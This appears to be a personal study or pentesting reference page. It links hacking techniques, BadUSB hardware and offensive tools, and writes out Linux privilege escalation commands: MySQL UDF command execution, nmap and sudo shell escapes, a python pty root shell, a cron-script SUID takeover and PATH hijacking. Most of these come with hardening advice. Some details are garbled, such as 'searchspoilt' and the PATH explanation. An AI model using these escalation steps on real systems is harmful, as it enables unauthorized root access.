# Hacker Techniques

## Techniques
[Setting up a reverse shell [Network Chuck]](https://www.youtube.com/watch?v=bXCeFPNWjsM&list)

[NullByte HowTo [Huge Resource]](https://null-byte.wonderhowto.com/)

* [MFA Fatigue](https://www.bleepingcomputer.com/news/security/mfa-fatigue-hackers-new-favorite-tactic-in-high-profile-breaches/amp/) - Spamming a login that requires MFA until a user approves to stop the notifications, or follow up with a call pretending to be IT requesting approval
* [Domain Shadowing](https://www.bleepingcomputer.com/news/security/domain-shadowing-becoming-more-popular-among-cybercriminals/amp/) - Subcategory of DNS hijacking, where threat actors compromise the DNS of a legitimate domain to host their own subdomains for use in malicious activity but do not modify the legitimate DNS entries that already exist. These subdomains are then used to create malicious pages on the cybercriminals' servers while the domain owner's site's web pages and DNS records remain unchanged, and the owners don't realize they have been breached.

* [Man In The Middle (MITM)](https://www.techtarget.com/iotagenda/definition/man-in-the-middle-attack-MitM)
    * [Spoofing Hotel Wifi ](https://www.lookout.com/blog/spoofed-wifi-60-minutes)
* [Bypass Software Registration](https://null-byte.wonderhowto.com/how-to/hacks-behind-cracking-part-1-bypass-software-registration-0132568/) - Run program in a debugger
* Finding hidden subdomains
    * [sublist3r (Linux)](https://www.kali.org/tools/sublist3r/) [[Using sublist3r tutorial]](https://null-byte.wonderhowto.com/how-to/discover-hidden-subdomains-any-website-with-subfinder-0341687/)
* [Phishing Windows Credentials](https://pentestlab.blog/2020/03/02/phishing-windows-credentials/)
    * [FakeLogonScreen](https://github.com/bitsadmin/fakelogonscreen)


## BadUSB

[Broad overview of malicious USB attacks](https://elie.net/blog/security/what-are-malicious-usb-keys-and-how-to-create-a-realistic-one/)
* General [https://www.gdatasoftware.com/blog/2021/11/usb-drives-still-a-danger](https://www.gdatasoftware.com/blog/2021/11/usb-drives-still-a-danger)
* USB Attack Vectors [https://elie.net/blog/security/what-are-malicious-usb-keys-and-how-to-create-a-realistic-one/](https://elie.net/blog/security/what-are-malicious-usb-keys-and-how-to-create-a-realistic-one/) 

### HID USBs

* [Hak5 Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) 
    * [Rubber Ducky Use](https://blog.teamascend.com/rubber-ducky)
    * [Modify the USB Rubber Ducky with Custom Firmware](https://null-byte.wonderhowto.com/how-to/modify-usb-rubber-ducky-with-custom-firmware-0177335/)
* [Pwnie Cactus](https://pwnieexpres.com/en-au/products/cactus-whid-wifi-hid-injector-an-usb-rubberducky) - HID Injector, Key Logger & WiFi
* [Hak5 O.MG Plug](https://hak5.org/collections/omg-row2/products/omg-plug) - Standard cable with HID Injector, Wifi & Key Logger
    * [Verge Article on O.MG cable](https://www.theverge.com/23321517/omg-elite-cable-hacker-tool-review-defcon) 
* [DIY Rubber Ducky on Teensy](https://medium.com/iqube-kct/bad-usb-using-teensy-1633ad7cd01)

### Disguised Microprocessor USB's
* Bash Bunny - [Buy](https://shop.hak5.org/products/bash-bunny) & [Official Documentation [Huge resource]](https://docs.hak5.org/bash-bunny/)
   * [Cron.dk - Poor Man’s Bash Bunny](https://www.cron.dk/poor-mans-bash-bunny/)
* P4wnP1 - Pi Zero based (similar to BashBunny) 
   * [P4wnP1 - Official Wiki [Huge resource]](https://p4wnp1.readthedocs.io/en/latest/) & [P4wnP1 - Full build and setup ](https://gideonwolfe.com/posts/security/p4wnp1/)
   * [P4wnP1-Bilby](https://wjmccann.github.io/blog/2017/11/09/Introducing-the-P4wnP1-Bilby) [Australian P4wnp1 variant]
   * [P4wnP1_aloa](https://github.com/RoganDawes/P4wnP1_aloa) [Updated version of P4wnp1]

* [Raspberry Pi Zero Wifi Hacking Tool](https://thesmashy.medium.com/raspberry-pi-zero-w-wifi-hacking-gadget-63e3fa1c3c8d)
* [PoisonTap - Raspberry Pi-based C2 Agent for WiFi & Unencrypted Data](https://www.dailydot.com/debug/poisontap-hacking-tool/)

Hardware
* [Buy Raspberry Pi Zero ](https://core-electronics.com.au/raspberry-pi-pico.html)
* [Banana Pi BPI M2 Zero - AliExpress](https://www.aliexpress.com/item/32839074880.html) (Pi Zero Alternative)

### USB Port Killers

* [Buy USB Killer](https://usbkill.com/) 
* [General Overview of USB Killers](https://www.darkreading.com/endpoint/rule-of-thumb-usb-killers-pose-real-threat)

## Other Devices
* Raspberry Pi
   * [Make a Hacking machine with Raspberry pi ](https://maker.pro/raspberry-pi/projects/hacking-machine-with-raspberry-pi)
   * [Hacking Kit with Raspberry Pi - SSH Instructions](https://gbhackers.com/raspberry-pi-and-kali-linux/)
   * [Beginner Hacking Kit with the Raspberry Pi 3 - Many Ideas](https://null-byte.wonderhowto.com/how-to/build-beginner-hacking-kit-with-raspberry-pi-3-model-b-0184144/)
   * [SwissArmyPi Converts your Raspberry Pi into a Strong Hacking Tool](https://medevel.com/swissarmypi/)
   * [Damn Vulnerable Raspberry Pi](https://whitedome.com.au/re4son/sticky-fingers-dv-pi/)

* [Flipper Zero](https://flipperzero.one/) - Penetration multi-tool
    * Sub 1GHz for wireless access control (garage door, booms, remote keys)
    * 125kHz RFID Reader/Emulator
    * NFC Reader/Emulator
    * Bluetooth
    * BadUSB/RubberDucky
    * Infrared Transceiver & Learning
    * 1-wire Contact key

* [WiPhone](https://www.wiphone.io/) - Open source WiFi phone

----------


## Linux Privilege Escalation

[Basic Linux Priviledge Escalation [Cheat sheet]](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[How to conduct Linux priviledge escalations](https://www.techtarget.com/searchsecurity/feature/How-to-conduct-Linux-privilege-escalations)
[Broad Guide to Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)<span style="text-decoration:underline;"> - Notes below</span>

**<span style="text-decoration:underline;">Kernel Exploits </span>**

For a kernel exploit attack to succeed, four conditions are required:



* A vulnerable kernel
* A matching exploit
* The ability to transfer the exploit onto the target
* The ability to execute the exploit on the target

_Example_: Dirty Cow Exploit replaces “root” with “rash” by editing the /etc/passwd file



* [DirtyCow variants on GitHub](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

_Example_: [Dirty Pipe Exploit](https://arstechnica.com/information-technology/2022/03/linux-has-been-bitten-by-its-most-high-severity-vulnerability-in-years/) [[Link to code](https://haxx.in/files/dirtypipez.c) that hijacks SUID binary for root access]

Kernel exploits can be searched through Kali using “searchspoilt”



* $ searchspoilt Linux Kernel 2.6.24 (← Kernel number found by running uname -a)

**<span style="text-decoration:underline;">Root-Service Exploits</span>**

Exploits that operate through services running as root. 

Check open and active ports by running netstat -antup [[How to use netstat]](https://www.howtogeek.com/513003/how-to-use-netstat-on-linux/)

_Examples_: [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue), [SambaCry](https://thehackernews.com/2017/05/samba-rce-exploit.html) 

_Example_: [PwnKit](https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/) runs on the back of the PolKit daemon for system-policy management

[MySQL UDF Dynamic Library Exploit](https://www.exploit-db.com/exploits/1518/)



* Find services running as root: ps -aux | grep root
* From the mysql shell:
    * create function do_system returns integer so name ‘raptor_udf2.so’
    * select do_system(‘id > /tmp/out; chown smeagol.smeagol /tmp/out’);
    * \! sh

**<span style="text-decoration:underline;">SUID Executable Exploits</span>**

“Set user ID” executes file permissions with a specific user using ‘s’ instead of ‘x’ in the permission set (eg. -rwsr-xr-x allows low privilege users to execute with root privileges). 

<span style="text-decoration:underline;">Nmap “Escape to Shell” Exploit (Older versions of nmap)</span>



* Find executables with SUID bit set: find / -perm -u=s -type f 2>/dev/null
* Confirm nmap has SUID bit set: ls -la /usr/local/bin/nmap
* Run nmap in Interactive Mode: nmap --interactive
* Escape to the shell as root: !sh

Avoid this by:



* Never set SUID on any program that allows escape to shell
* Never set SUID on any editor/comiler/interpreter

**<span style="text-decoration:underline;">SUDO Exploits</span>**

Misconfigured SUDO rights can allow root access through programs that edit code or allow escape to the shell

<span style="text-decoration:underline;">Cmd Execute “Escape to Shell” Exploitls </span>



* Determine commands which run as SUDO: sudo -l
* Find command’s execute parameter: sudo find /home -exec sh -i \;

<span style="text-decoration:underline;">Python “Shell Spawn” Exploit</span>



* Spawn a python shell: sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’

Avoid this by:



* Never give SUDO to any program that allows escape to shell
* Never give SUDO to vi, more, less, nmap, perl, ruby, python, gdb and others

**<span style="text-decoration:underline;">cron job Exploits</span>**

cron jobs usually run with root privilege to poorly configured cron files can allow arbitrary code to be executed

<span style="text-decoration:underline;">World-writable cron script Exploit</span>

* Print world-writeable files find / -perm -2 -type f 2>/dev/null
* Confirm cron file is writeable ls -la /usr/local/sbin/cron-logrotate.sh
* Write C file in /tmp cd /tmp then vi rootme.c
* Compile C file cat rootme.c
* Change exec owner & group to root
echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;” >/usr/local/sbin/cron-logrotate.sh
* After 5 mins confirm C file root privilege ls -la rootme
* Run file to spawn root shell ./rootme

Avoid this by:



* Scripts & binaries in cron jobs should not be writable
* cron file should not be writable except for root
* cron.d directory should not be writable except for root

**<span style="text-decoration:underline;">‘.’ User Path Exploits</span>**

‘.’ allows the user to execute binaries/script from their current directory. If ‘.’ is removed, it allows attackers to rename a file as a command (eg. ls) that will execute as soon as someone (ideally with root privileges) uses it in the file’s directory.

ls “PATH Variable” Exploit
* Create a file in Home named “ls” with your malicious codename nano ls
* Add ‘.’ to the PATH variable PATH=.:${PATH}
* Root user executes ls and grants root privileges 

----------


## Windows Exploits

* [Teamviewer Flaw for cracking user passwords](https://threatpost.com/teamviewer-fhigh-severity-flaw-windows-app/158204/)
* [Remotely dumping Windows credentials](https://meriemlarouim.medium.com/credentials-in-windows-and-how-to-dump-them-remotely-b5c315bb76f4)
* [Active directory pentesting: cheatsheet and beginner guide](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
* [Using Impacket to Dump Windows Secrets](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)

## Tools

[Pentesttools.net ](https://pentesttools.net/)

[Hacking Tools [RESOURCE]](https://en.m.wikibooks.org/wiki/Hacking/Tools)

[Wordlists & Rainbow Tables for WEP/WPA/WPA2](https://wifi0wn.wordpress.com/wepwpawpa2-cracking-dictionary/)

[Book of Secret Knowledge - Huge reference for various IT](https://github.com/trimstray/the-book-of-secret-knowledge#hackingpenetration-testing-toc)


### Tool List

* [Kali Linux](https://www.kali.org/)
    * [Kali’s Default Credentials (and tools shipped with)](https://www.kali.org/docs/introduction/default-credentials/)
* [Metasploit](https://www.metasploit.com/) - TCP port scanning & vulnerability identifcation/exploitation
    * Default credentials: Username - postgres, Password - postgres
    * [What is Metasploit?](https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html)
    * [Installing Metaspoilt on Ubuntu](https://adamtheautomator.com/install-metasploit-on-ubuntu/)
    * [Basic Metaspoilt Commands](https://www.tutorialspoint.com/metasploit/metasploit_basic_commands.htm)
    * [Rapid 7 Quick Start Guide](https://docs.rapid7.com/metasploit/)
    * [Metaspoilt Unleashed [Free Course]](https://www.offensive-security.com/metasploit-unleashed/)
    * [Metasploit for Pentesters](https://www.hackingarticles.in/metasploit-for-pentester-sessions/)
    * Modules
        * [Kerberos Domain Username Enumeration](https://www.attackdebris.com/?p=311)
        * [500 Most Common Usernames](https://www.attackdebris.com/?p=364)
        * [Meterpreter Tips & Tricks](https://medium.com/@rob.mccarthy31/meterpreter-tips-tricks-17877dda10fa)
* [John the Ripper](https://www.openwall.com/john/)
    * [Usage Examples with John the Ripper](https://www.openwall.com/john/doc/EXAMPLES.shtml)
    * [John the Ripper Tips and Tutorials](https://www.varonis.com/blog/john-the-ripper)
* [Hashcat](https://hashcat.net/hashcat/)
    * [How to crack passwords with Hashcat](https://geekflare.com/password-cracking-with-hashcat/) 
    * [CrackQ on GitHub](https://github.com/f0cker/crackq)
    * [CrackQ (GUI Interface with automation)](https://www.helpnetsecurity.com/2019/12/04/password-cracking-pentesters/)
* [Hydra](https://www.kali.org/tools/hydra/)
    * [How to Use Hydra - SSH Password Spraying, Dictionary Attacks, ect](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/)
    * [How to use Hydra to Brute-Force SSH Connections](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
    * [Hydra Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)
* [Burp Suite](https://portswigger.net/burp)
* [Nessus](https://www.tenable.com/products/nessus/nessus-professional) - Expensive Vulnerability scanner
* [OpenVAS](https://www.openvas.org/) - Open Source Vulnerability Scanner
   * [Installing OpenVAS on Kali](https://www.geeksforgeeks.org/installing-openvas-on-kali-linux/)
* [OWASP ZAP - Zed Attack Proxy](https://www.zaproxy.org/)
* [Cain and Abel](https://sectools.org/tool/cain/) - Windows-only password recovery tool
* [sqlmap](https://sqlmap.org/) - Automated scanning & exploitation of SQL injection vulnerabilities
* [nmap](https://nmap.org/) - Security audit and network discovery
    * [How to use Nmap for vulnerability scanning - NSE](https://geekflare.com/nmap-vulnerability-scan/)
    * [ncat](https://nmap.org/ncat/) - Built into NMap for reading and writing data across networks 
    * [Zenmap](https://nmap.org/book/zenmap.html) - GUI version of NMap
* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=getting_started)
    * [How To Use Aircrack-ng](https://techofide.com/blogs/how-to-use-aircrack-ng-aircrack-ng-tutorial-practical-demonstration/)
    * [wikiHow - Cracking WPA/WPA2](www.wikihow.com/Hack-WPA/WPA2-Wi-Fi-with-Kali-Linux)
* [W3af](https://w3af.org/)
* [Mimikatz (on GitHub)](https://github.com/gentilkiwi/mimikatz/wiki)
    * [Unofficial Guide & Command Reference](https://adsecurity.org/?page_id=1821)
    * [Blog - What is Mimikatz (Beginners Guide)](https://www.varonis.com/blog/what-is-mimikatz)
* [Karkinos](https://github.com/helich0pper/Karkinos) - Pentesting multitool
    * Encode/Decode, encrypt/decrypt, generate/crack hashes, 
    * Port scanning, reverse shell handling, file busting
* [Sifter](https://github.com/whiterabb17/sifter) - OSINT, recon & vulnerability scanning/exploitation
    * Tutorial - [How Sifter stacks and automates useful pentesting tools](https://www.hackingloops.com/sifter/)
* [Sn1per](https://github.com/1N3/Sn1per) - Discover attack surfaces & vulnerabilities, automate exploits
* [Commix](https://commixproject.com/) - Automated scanning & exploitation of command injection vulnerabilities
    * [Commix on GitHub](https://github.com/commixproject/commix)
* [BeEF](https://beefproject.com/) - Browser Exploitation Framework using client-side attack vectors
    * [BeEF on GitHub](https://github.com/beefproject/beef)
* [HackTools](https://github.com/LasCC/Hack-Tools) - Web extension with tools & cheat sheets (works with Metaspoilt)
    * SQLi, XSS, Local File Inclusion
    * Dynamic Reverse Shell Generator
    * Data Exfil & download to remote machines
    * Hash Generator for SHA1, SHA256, SHA512, MD5, SM3, etc.
    * MSFVenom for payload creation
* [Modlishka](https://github.com/drk1wi/Modlishka) - Automated HTTP reverse proxy
    * Poison HTTP 301 browser cache
    * Hijack non-TLS URLs
    * Identify/Highlight 2FA vulnerabilities
* [Dirsearch](https://github.com/maurosoria/dirsearch) - Brute force web path scanning
    * Find hidden/unhidden web directories & invalid pages
* [Greenbone OpenVAS](https://www.openvas.org/) - Vulnerability scanner built into Kali Linux
* [Ettercap](https://www.ettercap-project.org/) - Man in the middle attack platform
